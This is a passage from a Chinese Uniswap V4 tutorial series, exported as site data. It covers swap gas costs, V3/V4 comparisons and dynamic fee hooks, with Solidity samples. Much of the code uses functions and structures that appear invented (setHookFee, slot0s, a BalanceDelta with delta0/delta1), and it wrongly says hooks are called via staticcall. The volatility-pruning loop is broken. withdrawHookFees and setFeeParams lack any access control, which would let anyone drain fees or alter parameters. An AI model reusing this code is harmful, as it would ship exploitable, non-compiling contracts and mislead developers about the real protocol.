J --&gt; K{还有剩余数量?}\n    K --&gt;|是| L[继续下一次循环]\n    K --&gt;|否| M[退出循环]\n\n    style E fill:#fff3e0\n    style F fill:#fff3e0\n\n\n5. Gas成本分析\n5.1 swap函数Gas分解\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n阶段操作Gas成本说明准备参数验证~2,000检查池子、参数状态读取~3,000SLOAD pool状态beforeSwap HookHook调用~5,000-50,000取决于Hook复杂度交换循环每次迭代~15,000包括计算、更新跨tick~20,000流动性更新afterSwap HookHook调用~5,000-30,000取决于Hook复杂度结算settle/take~10,000unlock时结算总计简单swap~60,000无跨tick复杂swap~150,000+多次跨tick+复杂Hook\n5.2 V3 vs V4 Gas对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n场景V3 GasV4 Gas差异单池swap~100,000~75,000-25%跨1个tick~120,000~95,000-21%跨3个tick~180,000~145,000-19%3跳交易~300,000~180,000-40%ETH交易~110,000~60,000-45%\n5.3 Gas优化建议\n// 1. Hook中避免存储操作\ncontract GasOptimizedHook is IHooks {\n    // 错误：每次都写入存储\n    mapping(address =&gt; uint256) public lastSwapTime;\n \n    // 正确：只在必要时写入\n    function beforeSwap(...) external returns (bytes4, int256, int256) {\n        // 使用memory而不是storage\n        uint256 tempValue = _calculateInMemory();\n \n        // 批量写入\n        if (needsUpdate) {\n            lastSwapTime[msg.sender] = block.timestamp;\n        }\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n}\n \n// 2. 使用staticcall而不是call\n// PoolManager中使用静态调用防止Hook修改状态\n(bool success, bytes memory data) = address(hooks).staticcall(...);\n \n// 3. 缓存存储变量\nfunction swap(...) external returns (BalanceDelta) {\n    // 一次性读取多个存储变量\n    Pool.State storage pool = pools[poolId];\n    Pool.Slot0 memory slot0 = slot0s[poolId];\n \n    // 使用缓存的变量\n    uint160 sqrtPrice = slot0.sqrtPriceX96;\n    // ...\n}\n \n// 4. 短路求值\nfunction beforeSwap(...) external returns (bytes4, int256, int256) {\n    // 快速路径：小额交易直接通过\n    if (abs(params.amountSpecified) &lt; 1e15) {\n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    // 复杂逻辑只在大额时执行\n    // ...\n}\n\n6. V3 vs V4 交换流程对比\n6.1 架构对比\ngraph TB\n    subgraph V3Swap[&quot;V3交换流程&quot;]\n        V3U[用户] --&gt; V3R[SwapRouter]\n        V3R --&gt; V3P[UniswapV3Pool]\n        V3P --&gt; V3T[代币转账]\n        V3T --&gt; V3C[uniswapV3SwapCallback]\n        V3C --&gt; V3T2[代币转账]\n        V3T2 --&gt; V3V[验证余额]\n    end\n\n    subgraph V4Swap[&quot;V4交换流程&quot;]\n        V4U[用户] --&gt; V4R[SwapRouter]\n        V4R --&gt; V4PM[PoolManager]\n        V4PM --&gt; V4BH[beforeSwap Hook]\n        V4PM --&gt; V4SL[交换循环]\n        V4PM --&gt; V4AH[afterSwap Hook]\n        V4PM --&gt; V4D[记录deltas]\n        V4D --&gt; V4S[unlock时结算]\n    end\n\n    style V4PM fill:#e3f2fd\n    style V4D fill:#c8e6c9\n\n6.2 功能对比表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n功能V3V4优势方基础交换✅✅相同跨tick交换✅✅相同动态费率❌✅（Hook）V4限价订单❌✅（Hook）V4MEV保护❌✅（Hook）V4原生ETH❌✅V4批量操作❌✅V4Gas效率基准优化20-40%V4\n\n7. 实际交换示例\n7.1 单池交换\n// 用户想用1 ETH交换USDC\nfunction exampleSinglePoolSwap() external {\n    PoolKey memory key = PoolKey({\n        currency0: CurrencyLibrary.NATIVE,  // ETH\n        currency1: Currency.wrap(address(usdc)),   // USDC\n        fee: 3000,\n        tickSpacing: 60,\n        hooks: address(0)  // 无Hook\n    });\n \n    SwapParams memory params = SwapParams({\n        zeroForOne: true,  // ETH→USDC\n        amountSpecified: 1e18,  // 精确输入1 ETH\n        sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,  // 最低价格限制\n        hookData: &quot;&quot;\n    });\n \n    BalanceDelta memory limits = BalanceDelta({\n        delta0: -1e18,   // 最多输入1 ETH\n        delta1: 0        // 最少输出0 USDC（无限制）\n    });\n \n    BalanceDelta memory delta = poolManager.swap(key, params, limits);\n \n    // delta.delta0 = -1e18 (输入1 ETH)\n    // delta.delta1 = 2000e6 (输出2000 USDC)\n \n    // 结算\n    poolManager.settle{value: 1e18}(key.currency0, 1e18);\n    poolManager.take(key.currency1, msg.sender, uint256(delta.delta1));\n}\n7.2 多跳交换\n// ETH → USDC → WBTC\nfunction exampleMultiHopSwap() external {\n    // 第一跳：ETH/USDC\n    PoolKey memory key1 = PoolKey({\n        currency0: CurrencyLibrary.NATIVE,\n        currency1: Currency.wrap(address(usdc)),\n        fee: 3000,\n        tickSpacing: 60,\n        hooks: address(0)\n    });\n \n    // 第二跳：USDC/WBTC\n    PoolKey memory key2 = PoolKey({\n        currency0: Currency.wrap(address(usdc)),\n        currency1: Currency.wrap(address(wbtc)),\n        fee: 3000,\n        tickSpacing: 60,\n        hooks: address(0)\n    });\n \n    // 执行多跳交换（原子性）\n    BalanceDelta memory totalDelta = _executeMultiHop(\n        key1,\n        key2,\n        1e18  // 输入1 ETH\n    );\n \n    // 结算\n    poolManager.settle{value: 1e18}(CurrencyLibrary.NATIVE, 1e18);\n    poolManager.take(Currency.wrap(address(wbtc)), msg.sender, uint256(-totalDelta.delta1));\n}\n \nfunction _executeMultiHop(\n    PoolKey memory key1,\n    PoolKey memory key2,\n    uint256 amountIn\n) private returns (BalanceDelta memory) {\n    // 第一跳\n    SwapParams memory params1 = SwapParams({\n        zeroForOne: true,\n        amountSpecified: int256(amountIn),\n        sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n        hookData: &quot;&quot;\n    });\n \n    BalanceDelta memory delta1 = poolManager.swap(key1, params1, BalanceDelta(0, 0));\n \n    // 第二跳（使用第一跳的输出）\n    SwapParams memory params2 = SwapParams({\n        zeroForOne: true,\n        amountSpecified: delta1.delta1,  // USDC输出作为输入\n        sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n        hookData: &quot;&quot;\n    });\n \n    BalanceDelta memory delta2 = poolManager.swap(key2, params2, BalanceDelta(0, 0));\n \n    // 返回总变化\n    return BalanceDelta({\n        delta0: delta1.delta0,     // ETH输入\n        delta1: delta2.delta1      // WBTC输出\n    });\n}\n\n8. 本章小结\n8.1 swap流程总结\nmindmap\n  root((swap流程))\n    准备阶段\n      参数验证\n      状态获取\n      Hook存在检查\n    Hook执行\n      beforeSwap\n      afterSwap\n      delta处理\n    主循环\n      查找下一个tick\n      计算目标价格\n      执行单步交换\n      更新流动性\n    结算阶段\n      计算最终delta\n      验证限制\n      settle/take\n\n8.2 关键概念回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念说明zeroForOne交换方向：true=token0→token1amountSpecified指定数量：正=精确输入，负=精确输出sqrtPriceLimitX96价格限制，防止滑点过大BalanceDelta代币变化：正=应收，负=应付deltas账户差额记录lock/unlock重入保护和结算\n8.3 Hook执行点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHook触发时机返回值主要用途beforeSwap交换前selector, delta0, delta1动态费率、自定义定价afterSwap交换后selector费用分配、交易追踪\n\n下一篇预告\n在下一篇文章中，我们将深入探讨费用系统与动态费率，包括：\n\nV4费用系统架构\n动态费率实现\nHook费用分配\n费用增长追踪\n与V3费用系统的对比\n\n\n参考资料\n\nUniswap V4 Core - PoolManager.sol\nUniswap V4 Core - SwapMath.sol\nUniswap V3 Core - UniswapV3Pool.sol\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/05-费用系统与动态费率":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/05-费用系统与动态费率","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/05-费用系统与动态费率.md","title":"05-费用系统与动态费率","links":[],"tags":[],"content":"死磕Uniswap V4（五）：费用系统与动态费率\n\n本文是「死磕Uniswap V4」系列的第五篇，深入剖析V4的费用系统架构和动态费率实现。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4概述与架构革命Singleton、Hooks、Flash Accounting02Hooks机制深度解析Hook接口、生命周期、实现模式03单例架构与瞬时会计PoolManager、Currency、Accounting04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析05费用系统与动态费率自定义费率、动态调整、费用分配06账户抽象与原生ETHCurrency类型、settle/take、批量操作07安全分析与最佳实践Hook安全、MEV防护、审计要点\n\n1. V4费用系统架构\n1.1 从V3到V4的费用变化\ngraph TB\n    subgraph V3Fees[&quot;V3费用系统&quot;]\n        V3T[固定费率等级]\n        V3F1[0.01%]\n        V3F2[0.05%]\n        V3F3[0.3%]\n        V3F4[1%]\n\n        V3T --&gt; V3F1\n        V3T --&gt; V3F2\n        V3T --&gt; V3F3\n        V3T --&gt; V3F4\n    end\n\n    subgraph V4Fees[&quot;V4费用系统&quot;]\n        V4T[自定义费率]\n        V4Base[基础费率]\n        V4Hook[Hook动态费率]\n        V4Dyn[实时调整]\n\n        V4T --&gt; V4Base\n        V4T --&gt; V4Hook\n        V4Hook --&gt; V4Dyn\n    end\n\n    style V4T fill:#e3f2fd\n    style V4Dyn fill:#c8e6c9\n\n1.2 费用结构定义\n/// @notice 费用配置\nlibrary Pool {\n    struct Fees {\n        uint16 fee;     // 基础费率（单位：1e-6，即0.0001%）\n        uint16 hookFee; // Hook控制的动态费率部分\n    }\n}\n \n/// @notice 协议费用\nstruct ProtocolFees {\n    uint16 token0; // token0的协议费率（单位：1e-4，即0.01%）\n    uint16 token1; // token1的协议费率（单位：1e-4，即0.01%）\n}\n费率单位说明：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费用类型单位示例值实际费率fee1e-630000.3%hookFee1e-65000.05%协议费1e-4100.1%\n1.3 总费率计算\n/// @notice 计算实际总费率\n/// @return 总费率（单位：1e-6）\nfunction getTotalFee(\n    bytes32 poolId,\n    Pool.Fees memory fees,\n    uint256 protocolFee\n) internal pure returns (uint256) {\n    // 总费率 = 基础费率 + Hook费率 + 协议费率\n    uint256 totalFee = uint256(fees.fee) + uint256(fees.hookFee);\n \n    // 协议费从LP费用中扣除\n    // 所以LP实际收到的费用 = totalFee - protocolFee\n \n    return totalFee;\n}\n \n/// @notice 计算LP实际收到的费用\n/// @return LP费用率（单位：1e-6）\nfunction getLpFee(\n    uint256 totalFee,\n    uint256 protocolFee\n) internal pure returns (uint256) {\n    return totalFee - (protocolFee * 10000 / 10000);  // 协议费率单位转换\n}\n\n2. 动态费率实现\n2.1 动态费率设计理念\n传统AMM的固定费率无法适应不同市场条件：\ngraph LR\n    subgraph StaticFee[&quot;固定费率问题&quot;]\n        A1[低波动期&lt;br/&gt;费率过高] --&gt; A2[交易量低]\n        A3[高波动期&lt;br/&gt;费率过低] --&gt; A4[LP收益不足]\n    end\n\n    subgraph DynamicFee[&quot;动态费率优势&quot;]\n        B1[低波动期&lt;br/&gt;降低费率] --&gt; B2[吸引交易量]\n        B3[高波动期&lt;br/&gt;提高费率] --&gt; B4[补偿LP风险]\n    end\n\n    style DynamicFee fill:#c8e6c9\n\n2.2 基于波动率的动态费率\n/// @notice 基于波动率的动态费率Hook\ncontract VolatilityBasedFeeHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 费率参数\n    struct FeeParams {\n        uint256 baseFee;           // 基础费率\n        uint256 minFee;            // 最低费率\n        uint256 maxFee;            // 最高费率\n        uint256 volatilityWindow;  // 波动率计算窗口\n        uint256 volatilityMultiplier; // 波动率乘数\n    }\n \n    mapping(bytes32 =&gt; FeeParams) public feeParams;\n \n    /// @notice 波动率追踪\n    struct VolatilityTracker {\n        uint256 lastTimestamp;\n        uint256 lastPrice;\n        uint256[] priceHistory;\n    }\n \n    mapping(bytes32 =&gt; VolatilityTracker) public volatilityTrackers;\n \n    constructor(IPoolManager _poolManager) {\n        poolManager = _poolManager;\n    }\n \n    /// @notice 设置费率参数\n    function setFeeParams(\n        bytes32 poolId,\n        uint256 baseFee,\n        uint256 minFee,\n        uint256 maxFee,\n        uint256 volatilityWindow,\n        uint256 volatilityMultiplier\n    ) external {\n        feeParams[poolId] = FeeParams({\n            baseFee: baseFee,\n            minFee: minFee,\n            maxFee: maxFee,\n            volatilityWindow: volatilityWindow,\n            volatilityMultiplier: volatilityMultiplier\n        });\n    }\n \n    /// @notice beforeSwap Hook：动态调整费率\n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        bytes32 poolId = key.poolId;\n \n        // 获取当前价格\n        (uint160 sqrtPriceX96, , , ) = poolManager.slot0s(poolId);\n        uint256 currentPrice = uint256(sqrtPriceX96);\n \n        // 更新波动率\n        uint256 volatility = _updateVolatility(poolId, currentPrice);\n \n        // 计算动态费率\n        FeeParams memory params = feeParams[poolId];\n        uint256 dynamicFee = _calculateDynamicFee(\n            volatility,\n            params.baseFee,\n            params.minFee,\n            params.maxFee,\n            params.volatilityMultiplier\n        );\n \n        // 更新Hook费率\n        uint16 hookFee = uint16(dynamicFee - params.baseFee);\n        poolManager.setHookFee(poolId, hookFee);\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    /// @notice 更新波动率\n    function _updateVolatility(\n        bytes32 poolId,\n        uint256 currentPrice\n    ) private returns (uint256) {\n        VolatilityTracker storage tracker = volatilityTrackers[poolId];\n \n        if (tracker.lastTimestamp == 0) {\n            // 首次调用\n            tracker.lastPrice = currentPrice;\n            tracker.lastTimestamp = block.timestamp;\n            tracker.priceHistory.push(currentPrice);\n            return 0;\n        }\n \n        // 添加当前价格到历史\n        tracker.priceHistory.push(currentPrice);\n \n        // 移除超出窗口的价格\n        FeeParams memory params = feeParams[poolId];\n        uint256 windowSeconds = params.volatilityWindow;\n \n        while (\n            tracker.priceHistory.length &gt; 1 &amp;&amp;\n            tracker.lastTimestamp - (block.timestamp - windowSeconds * tracker.priceHistory.length) &gt; windowSeconds\n        ) {\n            tracker.priceHistory[0] = tracker.priceHistory[tracker.priceHistory.length - 1];\n            tracker.priceHistory.pop();\n        }\n \n        // 计算波动率（标准差）\n        uint256 volatility = _calculateStandardDeviation(tracker.priceHistory);\n \n        tracker.lastPrice = currentPrice;\n        tracker.lastTimestamp = block.timestamp;\n \n        return volatility;\n    }\n \n    /// @notice 计算标准差\n    function _calculateStandardDeviation(uint256[] memory prices) private pure returns (uint256) {\n        if (prices.length &lt; 2) return 0;\n \n        // 计算平均价格\n        uint256 sum = 0;\n        for (uint256 i = 0; i &lt; prices.length; i++) {\n            sum += prices[i];\n        }\n        uint256 mean = sum / prices.length;\n \n        // 计算方差\n        uint256 variance = 0;\n        for (uint256 i = 0; i &lt; prices.length; i++) {\n            uint256 diff = prices[i] &gt; mean ? prices[i] - mean : mean - prices[i];\n            variance += (diff * diff) / prices.length;\n        }\n \n        // 返回标准差（平方根的近似值）\n        return sqrt(variance);\n    }\n \n    /// @notice 计算动态费率\n    function _calculateDynamicFee(\n        uint256 volatility,\n        uint256 baseFee,\n        uint256 minFee,\n        uint256 maxFee,\n        uint256 multiplier\n    ) private pure returns (uint256) {\n        // 费率调整 = 基础费率 + 波动率 * 乘数\n        uint256 feeAdjustment = (volatility * multiplier) / 1e18;\n        uint256 dynamicFee = baseFee + feeAdjustment;\n \n        // 限制在范围内\n        if (dynamicFee &lt; minFee) dynamicFee = minFee;\n        if (dynamicFee &gt; maxFee) dynamicFee = maxFee;\n \n        return dynamicFee;\n    }\n \n    /// @notice 平方根近似计算\n    function sqrt(uint256 x) private pure returns (uint256) {\n        if (x == 0) return 0;\n        uint256 z = (x + 1) / 2;\n        uint256 y = x;\n        while (z &lt; y) {\n            y = z;\n            z = (x / z + z) / 2;\n        }\n        return y;\n    }\n}\n2.3 基于交易量的动态费率\n/// @notice 基于交易量的阶梯费率Hook\ncontract VolumeBasedFeeHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 交易量区间和对应费率\n    struct VolumeTier {\n        uint256 minVolume;\n        uint256 maxVolume;\n        uint256 fee;\n    }\n \n    mapping(bytes32 =&gt; VolumeTier[]) public volumeTiers;\n \n    /// @notice 累计交易量\n    mapping(bytes32 =&gt; uint256) public cumulativeVolume;\n    mapping(bytes32 =&gt; uint256) public lastResetTime;\n \n    /// @notice 设置阶梯费率\n    function setVolumeTiers(\n        bytes32 poolId,\n        VolumeTier[] calldata tiers\n    ) external {\n        delete volumeTiers[poolId];\n        for (uint256 i = 0; i &lt; tiers.length; i++) {\n            volumeTiers[poolId].push(tiers[i]);\n        }\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        bytes32 poolId = key.poolId;\n        uint256 amount = abs(params.amountSpecified);\n \n        // 更新累计交易量\n        cumulativeVolume[poolId] += amount;\n \n        // 获取当前时间窗口的交易量\n        uint256 windowVolume = _getWindowVolume(poolId);\n \n        // 查找对应的费率档位\n        uint256 dynamicFee = _getFeeByVolume(poolId, windowVolume);\n \n        // 更新Hook费率\n        uint16 hookFee = uint16(dynamicFee - 3000); // 假设基础费率为3000\n        poolManager.setHookFee(poolId, hookFee);\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _getWindowVolume(bytes32 poolId) private view returns (uint256) {\n        // 获取最近1小时的交易量\n        uint256 resetTime = lastResetTime[poolId];\n        if (block.timestamp - resetTime &gt; 1 hours) {\n            return 0;\n        }\n        return cumulativeVolume[poolId];\n    }\n \n    function _getFeeByVolume(\n        bytes32 poolId,\n        uint256 volume\n    ) private view returns (uint256) {\n        VolumeTier[] storage tiers = volumeTiers[poolId];\n \n        for (uint256 i = 0; i &lt; tiers.length; i++) {\n            if (volume &gt;= tiers[i].minVolume &amp;&amp; volume &lt; tiers[i].maxVolume) {\n                return tiers[i].fee;\n            }\n        }\n \n        // 默认费率\n        return 3000;\n    }\n \n    function abs(int256 x) private pure returns (uint256) {\n        return x &gt;= 0 ? uint256(x) : uint256(-x);\n    }\n}\n2.4 基于时间的动态费率\n/// @notice 基于时间的动态费率Hook\ncontract TimeBasedFeeHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 时间段费率配置\n    struct TimeFee {\n        uint256 startHour;  // 开始小时（0-23）\n        uint256 endHour;    // 结束小时（0-23）\n        uint256 fee;        // 费率\n    }\n \n    TimeFee[] public timeFees;\n \n    constructor(IPoolManager _poolManager, TimeFee[] memory _timeFees) {\n        poolManager = _poolManager;\n        for (uint256 i = 0; i &lt; _timeFees.length; i++) {\n            timeFees.push(_timeFees[i]);\n        }\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 获取当前小时（UTC）\n        uint256 currentHour = (block.timestamp / 3600) % 24;\n \n        // 查找对应的费率\n        uint256 dynamicFee = _getFeeByTime(currentHour);\n \n        // 更新Hook费率\n        uint16 hookFee = uint16(dynamicFee - 3000);\n        poolManager.setHookFee(key.poolId, hookFee);\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _getFeeByTime(uint256 hour) private view returns (uint256) {\n        for (uint256 i = 0; i &lt; timeFees.length; i++) {\n            uint256 start = timeFees[i].startHour;\n            uint256 end = timeFees[i].endHour;\n \n            if (end &gt; start) {\n                // 正常时间段\n                if (hour &gt;= start &amp;&amp; hour &lt; end) {\n                    return timeFees[i].fee;\n                }\n            } else {\n                // 跨天时间段\n                if (hour &gt;= start || hour &lt; end) {\n                    return timeFees[i].fee;\n                }\n            }\n        }\n \n        // 默认费率\n        return 3000;\n    }\n}\n\n3. 费用增长追踪\n3.1 feeGrowthGlobal结构\n/// @notice 费用增长追踪\ncontract PoolManager {\n    /// @notice 每个流动性单位的费用累积\n    mapping(bytes32 poolId =&gt; uint256) public feeGrowthGlobal0X128;  // token0\n    mapping(bytes32 poolId =&gt; uint256) public feeGrowthGlobal1X128;  // token1\n \n    /// @notice 更新费用增长\n    function _updateFeeGrowth(\n        bytes32 poolId,\n        uint256 feeAmount0,\n        uint256 feeAmount1,\n        uint128 liquidity\n    ) internal {\n        if (liquidity &gt; 0) {\n            // 费用增长 = 费用金额 / 流动性 * Q128\n            feeGrowthGlobal0X128[poolId] += FullMath.mulDiv(\n                feeAmount0,\n                FixedPoint128.Q128,\n                liquidity\n            );\n \n            feeGrowthGlobal1X128[poolId] += FullMath.mulDiv(\n                feeAmount1,\n                FixedPoint128.Q128,\n                liquidity\n            );\n        }\n    }\n}\n3.2 费用增长计算图\nflowchart LR\n    A[交换执行] --&gt; B[计算费用&lt;br/&gt;feeAmount]\n    B --&gt; C[获取当前流动性&lt;br/&gt;liquidity]\n    C --&gt; D[费用增长&lt;br/&gt;feeGrowth = fee * Q128 / liquidity]\n    D --&gt; E[累加到&lt;br/&gt;feeGrowthGlobal]\n\n    E --&gt; F[LP领取费用时&lt;br/&gt;计算应得份额]\n    F --&gt; G[份额 = 当前feeGrowth&lt;br/&gt;- 上次feeGrowth]\n\n3.3 Tick级别的费用追踪\n/// @notice Tick信息\nlibrary Tick {\n    struct Info {\n        uint128 liquidityGross;              // 总流动性\n        int128 liquidityNet;                 // 净流动性\n        uint256 feeGrowthOutside0X128;       // 外部费用增长（token0）\n        uint256 feeGrowthOutside1X128;       // 外部费用增长（token1）\n        int56 tickCumulativeOutside;        // 外部tick累积\n        uint160 secondsPerLiquidityOutsideX128; // 外部每流动性秒数\n        uint32 secondsOutside;               // 外部秒数\n        bool initialized;                    // 是否已初始化\n    }\n}\n \n/// @notice 更新Tick的外部费用\nfunction _updateTickFees(\n    bytes32 poolId,\n    int24 tick,\n    bool zeroForOne,\n    uint256 feeGrowthGlobal0,\n    uint256 feeGrowthGlobal1\n) internal {\n    Tick.Info storage tickInfo = ticks[poolId][tick];\n \n    if (zeroForOne) {\n        // 向左移动，当前tick的外部 = 当前全局\n        tickInfo.feeGrowthOutside0X128 = feeGrowthGlobal0;\n        tickInfo.feeGrowthOutside1X128 = feeGrowthGlobal1;\n    } else {\n        // 向右移动，交换处理\n        tickInfo.feeGrowthOutside0X128 = feeGrowthGlobal0;\n        tickInfo.feeGrowthOutside1X128 = feeGrowthGlobal1;\n    }\n}\n\n4. Hook费用分配\n4.1 费用分配流程\nsequenceDiagram\n    participant U as User\n    participant PM as PoolManager\n    participant H as Hook\n    participant LP as LP提供者\n\n    U-&gt;&gt;PM: swap()\n    PM-&gt;&gt;PM: 计算费用\n\n    PM-&gt;&gt;H: afterSwap() Hook\n    H-&gt;&gt;H: 计算Hook费用份额\n\n    alt Hook需要费用\n        H-&gt;&gt;PM: 更新deltas收取费用\n    end\n\n    PM-&gt;&gt;PM: 计算LP费用份额\n    PM-&gt;&gt;PM: 更新feeGrowthGlobal\n\n    PM--&gt;&gt;U: 返回结果\n\n    Note over LP: LP领取费用时\n    LP-&gt;&gt;PM: collect()\n    PM-&gt;&gt;LP: 转账累积费用\n\n4.2 Hook费用收取\n/// @notice 在beforeSwap中收取额外费用\nfunction beforeSwap(\n    address sender,\n    PoolKey calldata key,\n    IPoolManager.SwapParams calldata params,\n    bytes calldata hookData\n) external returns (bytes4, int256, int256) {\n    bytes32 poolId = key.poolId;\n \n    // 计算Hook费用（例如：基于交易量的百分比）\n    uint256 hookFeeAmount = abs(params.amountSpecified) / 1000; // 0.1%\n \n    int256 delta0 = 0;\n    int256 delta1 = 0;\n \n    if (params.zeroForOne) {\n        // 卖出token0，收取token0作为Hook费用\n        delta0 = int256(hookFeeAmount);\n    } else {\n        // 卖出token1，收取token1作为Hook费用\n        delta1 = int256(hookFeeAmount);\n    }\n \n    // 记录费用收入\n    _recordHookFee(poolId, params.zeroForOne ? key.currency0 : key.currency1, hookFeeAmount);\n \n    return (IHooks.beforeSwap.selector, delta0, delta1);\n}\n \n/// @notice 记录Hook费用\nmapping(bytes32 =&gt; mapping(Currency =&gt; uint256)) public hookFees;\n \nfunction _recordHookFee(\n    bytes32 poolId,\n    Currency currency,\n    uint256 amount\n) private {\n    hookFees[poolId][currency] += amount;\n    emit HookFeeCollected(poolId, currency, amount);\n}\n \n/// @notice 提取Hook费用\nfunction withdrawHookFees(\n    bytes32 poolId,\n    Currency currency,\n    address recipient,\n    uint256 amount\n) external {\n    require(hookFees[poolId][currency] &gt;= amount, &quot;Insufficient fees&quot;);\n    hookFees[poolId][currency] -= amount;\n \n    if (CurrencyLibrary.isNative(currency)) {\n        payable(recipient).transfer(amount);\n    } else {\n        ERC20(Currency.unwrap(currency)).transfer(recipient, amount);\n    }\n \n    emit HookFeeWithdrawn(poolId, currency, recipient, amount);\n}\n4.3 LP费用分配\n/// @notice LP领取费用\nfunction collect(\n    PoolKey calldata key,\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount0,\n    uint128 amount1\n) external returns (uint256 collected0, uint256 collected1) {\n    bytes32 poolId = key.poolId;\n \n    // 获取当前的费用增长\n    uint256 feeGrowthGlobal0 = feeGrowthGlobal0X128[poolId];\n    uint256 feeGrowthGlobal1 = feeGrowthGlobal1X128[poolId];\n \n    // 获取用户上次领取的费用增长\n    (uint256 userFeeGrowth0, uint256 userFeeGrowth1) = _getUserFeeGrowth(\n        msg.sender,\n        poolId,\n        tickLower,\n        tickUpper\n    );\n \n    // 计算新产生的费用\n    uint256 feeGrowth0 = feeGrowthGlobal0 - userFeeGrowth0;\n    uint256 feeGrowth1 = feeGrowthGlobal1 - userFeeGrowth1;\n \n    // 获取用户的流动性\n    uint128 liquidity = _getUserLiquidity(msg.sender, poolId, tickLower, tickUpper);\n \n    // 计算可领取的费用\n    uint256 collectable0 = FullMath.mulDiv(liquidity, feeGrowth0, FixedPoint128.Q128);\n    uint256 collectable1 = FullMath.mulDiv(liquidity, feeGrowth1, FixedPoint128.Q128);\n \n    // 限制领取金额\n    if (amount0 &gt; 0 &amp;&amp; collectable0 &gt; amount0) collectable0 = amount0;\n    if (amount1 &gt; 0 &amp;&amp; collectable1 &gt; amount1) collectable1 = amount1;\n \n    // 更新用户的费用增长记录\n    _setUserFeeGrowth(\n        msg.sender,\n        poolId,\n        tickLower,\n        tickUpper,\n        feeGrowthGlobal0,\n        feeGrowthGlobal1\n    );\n \n    // 转账费用\n    if (collectable0 &gt; 0) {\n        deltas[msg.sender][key.currency0] += int256(collectable0);\n    }\n    if (collectable1 &gt; 0) {\n        deltas[msg.sender][key.currency1] += int256(collectable1);\n    }\n \n    emit Collect(msg.sender, poolId, tickLower, tickUpper, collectable0, collectable1);\n \n    return (collectable0, collectable1);\n}\n\n5. 协议费用\n5.1 协议费用结构\n/// @notice 协议费用配置\nstruct ProtocolFees {\n    uint16 token0; // token0协议费率（单位：1e-4，即0.01%）\n    uint16 token1; // token1协议费率（单位：1e-4，即0.01%）\n}\n \n/// @notice 协议费用累积\nuint256 public protocolFees0; // 累积的token0协议费\nuint256 public protocolFees1; // 累积的token1协议费\n5.2 协议费用计算\n/// @notice 计算协议费用\nfunction _calculateProtocolFees(\n    bytes32 poolId,\n    uint256 feeAmount0,\n    uint256 feeAmount1\n) internal view returns (uint256 protocolFee0, uint256 protocolFee1) {\n    ProtocolFees memory protocolFees = protocolFees[poolId];\n \n    // 协议费 = 总费用 * 协议费率 / 10000\n    if (protocolFees.token0 &gt; 0) {\n        protocolFee0 = feeAmount0 * protocolFees.token0 / 10000;\n    }\n    if (protocolFees.token1 &gt; 0) {\n        protocolFee1 = feeAmount1 * protocolFees.token1 / 10000;\n    }\n}\n \n/// @notice 提取协议费用\nfunction collectProtocolFees(\n    Currency currency,\n    address recipient,\n    uint256 amount\n) external {\n    require(msg.sender == owner, &quot;Not owner&quot;);\n \n    if (CurrencyLibrary.isNative(currency)) {\n        require(protocolFees0 &gt;= amount, &quot;Insufficient fees&quot;);\n        protocolFees0 -= amount;\n        payable(recipient).transfer(amount);\n    } else {\n        uint256 fees = currency == poolKey.currency0 ? protocolFees0 : protocolFees1;\n        require(fees &gt;= amount, &quot;Insufficient fees&quot;);\n        if (currency == poolKey.currency0) {\n            protocolFees0 -= amount;\n        } else {\n            protocolFees1 -= amount;\n        }\n        ERC20(Currency.unwrap(currency)).transfer(recipient, amount);\n    }\n \n    emit ProtocolFeesCollected(currency, recipient, amount);\n}\n\n6. 费用系统对比\n6.1 V3 vs V4 费用对比\ngraph TB\n    subgraph V3FeeSystem[&quot;V3费用系统&quot;]\n        V3Fixed[固定费率]\n        V3Tiers[4个档位]\n        V3Update[需要新版本升级]\n    end\n\n    subgraph V4FeeSystem[&quot;V4费用系统&quot;]\n        V4Dynamic[动态费率]\n        V4Custom[任意自定义]\n        V4Hook[Hook实现]\n    end\n\n    V3Fixed 